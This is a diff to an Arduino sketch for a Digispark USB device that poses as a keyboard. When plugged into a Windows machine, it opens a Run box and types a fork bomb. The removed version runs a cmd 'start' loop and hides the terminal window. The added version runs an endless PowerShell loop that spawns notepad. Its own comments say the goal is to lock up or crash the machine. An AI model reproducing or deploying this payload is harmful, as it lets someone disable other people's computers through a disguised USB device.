@@ -1,26 +1,26 @@
-//This script opens up a Windows command prompt(okay but how can i make it open anouther instance of another app?) and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes. Credits to BlackBoot.
 #include "DigiKeyboard.h"
 void setup() {
 }
 
 void loop() {
+
+  // Initialises Digispark keystoke injection
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
+
+  // Hit Win+R and launch powershell
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
+  DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  //Obfuscate the terminal
-  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //Run the fork bomb
+  
+  // Run infinite loop that opens a notepad instance on every run
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("for /l %x in (1,1,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do start"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.println("While ($true) {Start-Process 'C:\\Windows\\System32\\notepad.exe'}\;");
+
+  // This is a forkbomb
+
   for (;;) {
     /*Stops the digispark from running the scipt again*/
   }
